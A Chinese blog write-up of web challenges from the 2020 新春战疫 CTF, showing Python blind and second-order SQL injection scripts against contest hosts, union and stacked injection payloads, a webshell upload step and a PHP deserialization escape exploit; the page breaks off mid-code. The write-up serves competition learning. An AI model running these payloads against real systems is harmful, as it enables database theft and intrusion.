<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>2020新春战疫-网络安全公益赛解题记录</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/03/18/Hexo-%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&title=2020新春战疫-网络安全公益赛解题记录" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&title=2020新春战疫-网络安全公益赛解题记录" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&text=2020新春战疫-网络安全公益赛解题记录" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2020新春战疫-网络安全公益赛解题记录&body=Check out this article: http://yoursite.com/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-第一天"><span class="toc-number">1.</span> <span class="toc-text">0x 01 第一天</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-签到"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-code-in-morse"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 code_in_morse</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-ezupload"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 ezupload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-简单的招聘系统"><span class="toc-number">1.4.</span> <span class="toc-text">1.4 简单的招聘系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-盲注"><span class="toc-number">1.5.</span> <span class="toc-text">1.5 盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-6-babyphp"><span class="toc-number">1.6.</span> <span class="toc-text">1.6 babyphp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二天"><span class="toc-number">2.</span> <span class="toc-text">第二天</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-easysqli-copy"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 easysqli_copy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-blacklist"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 blacklist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-Ezsqli"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 Ezsqli</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第三天"><span class="toc-number">3.</span> <span class="toc-text">第三天</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-Flaskapp"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 Flaskapp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-easy-thinking"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 easy_thinking</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-Node-Game"><span class="toc-number">4.</span> <span class="toc-text">3.3 Node Game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-EzExpress"><span class="toc-number">4.1.</span> <span class="toc-text">3.4 EzExpress</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        2020新春战疫-网络安全公益赛解题记录
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-03-18T13:48:34.000Z" itemprop="datePublished">2020-03-18</time>
        
        (Updated: <time datetime="2020-03-25T15:58:29.213Z" itemprop="dateModified">2020-03-25</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/ctfwp/">ctfwp</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/gyctf/" rel="tag">gyctf</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="0x-01-第一天"><a href="#0x-01-第一天" class="headerlink" title="0x 01 第一天"></a>0x 01 第一天</h3><h4 id="1-1-签到"><a href="#1-1-签到" class="headerlink" title="1.1 签到"></a>1.1 签到</h4><p>抖音号：GAME.CTF里面的视频结尾就有</p>
<h4 id="1-2-code-in-morse"><a href="#1-2-code-in-morse" class="headerlink" title="1.2 code_in_morse"></a>1.2 code_in_morse</h4><p>流量包导出http对象，得到一个作者上传的一个jpg文件，改一下后缀打开得到一串莫斯电码，解码发现是base32格式，继续解码发现有png文件头，群里有师傅给了提示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py &gt; 1.png</span><br></pre></td></tr></table></figure>

<p>有师傅这样做的</p>
<p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200221222133362.png" alt></p>
<p>将条形码扫码，扫码网址：<a href="https://www.sojson.com/qr/deqr.html" target="_blank" rel="noopener">https://www.sojson.com/qr/deqr.html</a></p>
<p>得到一个网址：<a href="https://s2.ax1x.com/2020/02/06/1yPXJ1.jpg" target="_blank" rel="noopener">https://s2.ax1x.com/2020/02/06/1yPXJ1.jpg</a></p>
<p>访问得到一张图片，提示F5隐写，使用解密脚本得到flag</p>
<h4 id="1-3-ezupload"><a href="#1-3-ezupload" class="headerlink" title="1.3 ezupload"></a>1.3 ezupload</h4><p>直接上传php文件，连接蚁剑，执行./readflag得到flag</p>
<h4 id="1-4-简单的招聘系统"><a href="#1-4-简单的招聘系统" class="headerlink" title="1.4 简单的招聘系统"></a>1.4 简单的招聘系统</h4><p>方法一：</p>
<p>二次注入，exp如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#encoding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">database &#x3D; &quot;&quot;</span><br><span class="line">hex_database &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">def req(payload,asc):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;caddecc79f07485cb789f035fc7b3c3027c1555d32204a11.changame.ichunqiu.com&#x2F;index.php?register&quot;</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;regname&quot;: payload,</span><br><span class="line">        &quot;regpass&quot;: &quot;1&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    st &#x3D; time.time()</span><br><span class="line">    r &#x3D; requests.post(url, headers&#x3D;header,data&#x3D;data, timeout&#x3D;100)</span><br><span class="line">    if r.status_code !&#x3D; 200:</span><br><span class="line">        return req(payload, asc)</span><br><span class="line">    else:</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            return asc</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">i &#x3D; 1</span><br><span class="line">while i &lt; 10:</span><br><span class="line">    for j in range(30,148):</span><br><span class="line">        j &#x3D; chr(j)</span><br><span class="line">        k &#x3D; j.encode(&#39;hex&#39;)</span><br><span class="line">        username &#x3D; &quot;&#39;^(case  hex(mid((select flaaag from flag limit 1 offset 0) from 37 for &quot;+str(i)+&quot;)) when &#39;&quot;+ hex_database+ k +&quot;&#39; then sleep(3) else &#39;b&#39; end)+&#39;0&quot;</span><br><span class="line">        print username</span><br><span class="line">        if req(username,j)!&#x3D;&#39;&#39;:</span><br><span class="line">            database &#x3D; database + j # 这儿的j是字母</span><br><span class="line">            hex_database &#x3D;  hex_database + k # 这儿的k是字母对应的hex</span><br><span class="line">            print database</span><br><span class="line">            break</span><br><span class="line">    i &#x3D; i + 1</span><br></pre></td></tr></table></figure>

<p>方法二：弱口令+SQL注入查询 </p>
<p>登陆处万能密码 1’ or 1=1# 然后在blank page查询处查flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,database(),3,4,5#   </span><br><span class="line">&#x2F;&#x2F; database():nzhaopin</span><br><span class="line">1&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()#     </span><br><span class="line">&#x2F;&#x2F; backup,flag,user</span><br><span class="line">1&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name&#x3D;&#39;flag&#39;#</span><br><span class="line">&#x2F;&#x2F; id,flaaag</span><br><span class="line">1&#39; union select 1,group_concat(flaaag),3,4,5 from flag#</span><br><span class="line">&#x2F;&#x2F; flag&#123;548f455e-fc8f-48c4-95ea-62ee4b645a68&#125;</span><br></pre></td></tr></table></figure>

<p>方法三：二次注入</p>
<p>猜测注册的语句应该是<code>$sql=insert into table values($id,&#39;$username&#39;,&#39;$password&#39;,&#39;$key&#39;)</code></p>
<p>构造payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注册：</span><br><span class="line">test&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#</span><br><span class="line">登录：</span><br><span class="line">账号：test</span><br><span class="line">密码：123</span><br><span class="line">得到数据库：backup,flag,user</span><br><span class="line">同理进一步查询可以得到flag</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225201009458.png" alt></p>
<h4 id="1-5-盲注"><a href="#1-5-盲注" class="headerlink" title="1.5 盲注"></a>1.5 盲注</h4><p>waf了<code>= &lt;&gt; like select union * &#39;</code>等,使用regex进行正则匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;0013a95d8ad14842a9bcba0096d069cb38ec1889e4534760.changame.ichunqiu.com&#x2F;index.php?id&#x3D;1 &quot;</span><br><span class="line">list &#x3D; &quot;qwertyuiopasdfghjklzxcvbnm_-0123456789&#123;&#125;&quot;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &quot;flag&#123;af35b43b&quot;</span><br><span class="line">for j in range(35):</span><br><span class="line">    for i in list:</span><br><span class="line">        st &#x3D; time.time()</span><br><span class="line">        payload &#x3D; url + &#39;&#39;&#39;and if((fl4g regexp &quot;^&#123;&#125;&quot;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        r &#x3D; requests.get(payload, timeout&#x3D;100)</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            print i</span><br><span class="line">            flag&#x3D;flag+i</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>

<h4 id="1-6-babyphp"><a href="#1-6-babyphp" class="headerlink" title="1.6 babyphp"></a>1.6 babyphp</h4><p>扫描目录发现<a href="http://www.zip源码泄露，下载审计" target="_blank" rel="noopener">www.zip源码泄露，下载审计</a></p>
<p>反序列化参考：<a href="https://www.gem-love.com/ctf/1669.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1669.html</a></p>
<p>由于是在逃逸字符，我们需要保证payload在进入属性中之后可以正常反序列化</p>
<p>通过本地调试，得到正常序列化时的字符</p>
<p><code>&quot;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;s:4:&quot;test&quot;;s:8:&quot;CtrlCase&quot;;N;}&quot;</code></p>
<p>其中nickname和age是可控内容</p>
<p>注意前面的内容中标注了有3个属性，为了保证属性一致，在payload前面加上CtrlCase的内容，然后在最后闭合语句，使unserialize忽略掉后面的CtrlCase</p>
<p>根据这个payload的字符数，我们需要在nickname中插入足量的黑名单字符，把payload挤出去</p>
<p>参考大师傅的脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age &#x3D; null;</span><br><span class="line">    public $nickname &#x3D; null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info</span><br><span class="line">&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line"></span><br><span class="line">    public function __construct($age, $nickname)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">        $this-&gt;nickname &#x3D; $nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class UpdateHelper</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __construct($newInfo, $sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $newInfo &#x3D; unserialize($newInfo);</span><br><span class="line">        $upDate &#x3D; new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser &#x3D; &quot;root&quot;;</span><br><span class="line">    public $dbpass &#x3D; &quot;root&quot;;</span><br><span class="line">    public $database &#x3D; &quot;test&quot;;</span><br><span class="line">    public $name &#x3D; &quot;admin&quot;;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token &#x3D; &quot;admin&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$db &#x3D; new dbCtrl();</span><br><span class="line">$user &#x3D; new User();</span><br><span class="line">$info &#x3D; new Info(&#39;&#39;,&#39;1&#39;);</span><br><span class="line">#echo serialize($info);</span><br><span class="line">$updatehelper &#x3D; new UpdateHelper(&quot;1&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">$info-&gt;CtrlCase &#x3D; $db;</span><br><span class="line">$user-&gt;nickname &#x3D; $info;</span><br><span class="line">$user-&gt;age &#x3D; &quot;select password,id from user where username&#x3D;?&quot;;</span><br><span class="line">$updatehelper-&gt;sql &#x3D; $user;</span><br><span class="line">&#x2F;&#x2F; echo serialize($updatehelper);</span><br><span class="line">$c &#x3D; &#39;&quot;;s:8:&quot;CtrlCase&quot;;&#39; . serialize($updatehelper) . &quot;&#125;&quot;;</span><br><span class="line">$length &#x3D; strlen($c);</span><br><span class="line">$c &#x3D; str_repeat(&#39;union&#39;, $length).$c;   </span><br><span class="line">echo($c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在update.php内post提交age=&amp;nickname=加代码的输出结果，提交得到admin密码，登录得到flag</p>
<p>参考：<a href="http://blog.ydspoplar.top/2020/02/24/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%AB%E8%B5%9B-WP/#babyphp" target="_blank" rel="noopener">http://blog.ydspoplar.top/2020/02/24/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%AB%E8%B5%9B-WP/#babyphp</a></p>
<h3 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h3><h4 id="2-1-easysqli-copy"><a href="#2-1-easysqli-copy" class="headerlink" title="2.1 easysqli_copy"></a>2.1 easysqli_copy</h4><p>参考资料：从宽字节注入认识PDO的原理和正确使用 <a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/216336.html</a></p>
<p>原理：输入的参数并没有用单引号包裹，发送数据的时候会用单引号进行了包裹，构成了宽字节注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;72e089bbcaf245b2904526c4e4b0518236a6f2cf0f304d10.changame.ichunqiu.com&#x2F;?id&#x3D;&quot;</span><br><span class="line">list &#x3D; &quot;qwertyuiopasdfghjklzxcvbnm_-0123456789&#123;&#125;,&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for j in range(35):</span><br><span class="line">    for i in list:</span><br><span class="line">        # payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        # payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;table1&#39;)) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(fllllll4g))from(table1)) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        payload &#x3D; payload.encode(&#39;hex&#39;)</span><br><span class="line">        param &#x3D; &quot;1&quot; + urllib.unquote(&quot;%df&quot;) + &quot;&#39;;set @a&#x3D;0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;&quot;.format(payload)</span><br><span class="line">        param &#x3D; urllib.quote(param)</span><br><span class="line">        url1 &#x3D; url + param</span><br><span class="line">        st &#x3D; time.time()</span><br><span class="line">        r &#x3D; requests.get(url1, timeout&#x3D;100)</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            flag&#x3D;flag+i</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>

<h4 id="2-2-blacklist"><a href="#2-2-blacklist" class="headerlink" title="2.2 blacklist"></a>2.2 blacklist</h4><p>需要先利用堆叠注入查询表和字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;#</span><br></pre></td></tr></table></figure>

<p>得到FlagHere表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;FlagHere&#96;;#</span><br></pre></td></tr></table></figure>

<p>得到flag字段</p>
<p>根据一叶飘零大佬的blog：<a href="https://skysec.top/2019/12/13/2019-FudanCTF-Writeup/" target="_blank" rel="noopener">https://skysec.top/2019/12/13/2019-FudanCTF-Writeup/</a> 构造exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;; handler &#96;FlagHere&#96; open as &#96;tgt&#96;;handler &#96;tgt&#96; read next;--</span><br></pre></td></tr></table></figure>

<h4 id="2-3-Ezsqli"><a href="#2-3-Ezsqli" class="headerlink" title="2.3 Ezsqli"></a>2.3 Ezsqli</h4><ul>
<li>无in注表名 </li>
</ul>
<p>参考：聊一聊bypass information_schema  <a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p>
<ul>
<li>无union select和字段名注数据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(2|(MID((select (select 1,1) &#x3D; (select * from f1ag_1s_h3r3_hhhhh limit 0,1)),1,1)&#x3D;0))</span><br><span class="line">列的数量有两个</span><br><span class="line"></span><br><span class="line">(2|(select (select 1) &#x3D; (select count(*) from f1ag_1s_h3r3_hhhhh)))</span><br><span class="line">共有一条记录</span><br><span class="line"></span><br><span class="line">(2|(select (select 1) &#x3D; (select id from f1ag_1s_h3r3_hhhhh)))</span><br><span class="line">记录有一个字段为id&#x3D;1</span><br></pre></td></tr></table></figure>

<p>参考这个：<a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">https://nosec.org/home/detail/3830.html</a></p>
<p>使用 <code>SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON))</code> 来另其返回二进制字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 